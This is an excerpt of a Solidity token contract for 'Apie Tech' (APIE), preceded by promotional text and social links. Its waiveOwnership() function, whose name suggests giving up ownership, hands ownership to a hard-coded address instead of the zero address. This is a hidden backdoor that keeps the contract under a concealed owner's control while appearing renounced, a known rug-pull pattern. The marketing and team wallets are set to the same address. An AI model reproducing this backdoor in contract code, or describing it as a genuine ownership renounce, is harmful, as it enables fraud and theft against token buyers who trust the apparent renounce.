...
We don't just develop your idea; @Apie Tech we present the simplest solutions 
to the most complex problems in the world of blockchain technology.
follow us :
WB : https://apietech.net
TW : https://twitter.com/ApieTechnology
TG : https://t.me/ApieTech
...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0x277b912d2E2Ba14b3B691B79aA56Ad1AB61c2e63);
    }
...
contract ApieTech is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Apie Tech";
    string private _symbol = "APIE";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x41F0c66527Fc920449B15e303EE42Ead7FE22Bad);
    address payable public teamWalletAddress = payable(0x41F0c66527Fc920449B15e303EE42Ead7FE22Bad);
